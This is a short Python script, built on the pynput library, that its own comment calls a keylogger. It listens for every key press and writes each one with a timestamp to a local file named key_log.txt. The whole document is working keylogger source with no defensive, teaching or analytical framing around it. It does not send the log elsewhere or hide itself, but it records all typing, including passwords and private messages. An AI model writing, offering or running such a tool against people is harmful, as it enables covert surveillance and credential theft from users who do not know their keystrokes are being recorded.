from pynput.keyboard import Key, Listener
import logging

# Set up logging
log_dir = ""
logging.basicConfig(filename=(log_dir + "key_log.txt"), 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')

# Define the function to log each keystroke
def on_press(key):
    try:
        logging.info(str(key))
    except AttributeError:
        logging.info('Special key {0} pressed'.format(key))

# Start the keylogger
with Listener(on_press=on_press) as listener:
    listener.join()